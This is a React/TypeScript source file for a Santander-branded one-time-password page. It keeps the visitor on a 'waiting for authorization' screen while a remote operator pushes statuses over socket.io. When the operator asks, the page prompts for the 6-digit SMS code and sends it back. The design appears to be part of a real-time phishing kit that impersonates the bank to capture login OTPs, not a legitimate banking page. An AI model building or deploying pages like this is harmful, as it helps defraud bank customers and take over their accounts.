import React, { useState, useEffect, FormEvent } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import io from 'socket.io-client';
import type { Socket } from 'socket.io-client';
import santanderLogo from '/santander-logo.svg';
import Spinner from '../components/Spinner';

interface StatusUpdateData {
    status: 'pending_otp_challenge' | 'approved' | 'denied';
    phone_ending_digits?: string;
}

const OtpVerificationPage = () => {
    const [searchParams] = useSearchParams();
    const attemptId = searchParams.get('attemptId');
    const navigate = useNavigate();

    const [pageStatus, setPageStatus] = useState('waiting'); // 'waiting' or 'entering_otp'
    const [phoneEnding, setPhoneEnding] = useState('');
    const [otp, setOtp] = useState('');
    const [errorMessage, setErrorMessage] = useState('');

    const [socket, setSocket] = useState<Socket | null>(null);

    useEffect(() => {
        if (!attemptId) {
            navigate('/login');
            return;
        }

        const newSocket: Socket = io('http://localhost:5000', {
            query: { attemptId }
        });

        setSocket(newSocket);

        newSocket.on('connect', () => {
            setPageStatus('waiting');
            newSocket.emit('user_is_waiting', { attemptId });
        });

        newSocket.on('status_updated', (data: StatusUpdateData) => {
            if (data.status === 'pending_otp_challenge' && data.phone_ending_digits) {
                setPhoneEnding(data.phone_ending_digits);
                setPageStatus('entering_otp'); // Go directly to OTP entry
                setErrorMessage('');
            } else if (data.status === 'approved') {
                navigate('/success');
            } else if (data.status === 'denied') {
                navigate('/login?status=denied');
            }
        });

        newSocket.on('error', (data: { message?: string }) => {
            setErrorMessage(data.message || 'An unknown error occurred.');
        });

        return () => {
            newSocket.disconnect();
        };
    }, [attemptId, navigate]);

    const handleOtpSubmit = (e: FormEvent) => {
        e.preventDefault();
        if (socket && otp.length === 6) {
            socket.emit('user_submitted_otp', { attemptId, otp });
        } else {
            setErrorMessage('Please enter a 6-digit OTP.');
        }
    };

    const renderContent = () => {
        if (pageStatus === 'entering_otp') {
            return (
                <form onSubmit={handleOtpSubmit}>
                    <h2 className="text-xl font-semibold text-center text-gray-800 mb-4">Enter Your One-Time Password</h2>
                    <p className="text-center text-gray-600 mb-6">A 6-digit code was sent to the number ending in <span className="font-bold">{phoneEnding}</span>.</p>
                    <input
                        type="text"
                        value={otp}
                        onChange={(e) => setOtp(e.target.value)}
                        maxLength={6}
                        className="w-full px-4 py-3 mb-4 text-center text-lg border-2 border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-transparent"
                        placeholder="_ _ _ _ _ _"
                    />
                    <button type="submit" className="w-full bg-red-600 text-white font-bold py-3 px-4 rounded-md hover:bg-red-700">Verify Code</button>
                </form>
            );
        }

        // Default case: show spinner
        return (
            <>
                <h2 className="text-xl font-semibold text-center text-gray-800 mb-6">Waiting for authorization...</h2>
                <Spinner />
                <p className="text-center text-gray-500 mt-4 text-sm">Please do not close this window. An agent is reviewing your request.</p>
            </>
        );
    };

    return (
        <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center p-4">
            <div className="w-full max-w-md">
                <img src={santanderLogo} alt="Santander Logo" className="h-12 mx-auto mb-8" />
                <div className="bg-white rounded-lg shadow-xl p-8">
                    {errorMessage && <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative mb-4" role="alert">{errorMessage}</div>}
                    {renderContent()}
                </div>
            </div>
        </div>
    );
};

export default OtpVerificationPage;
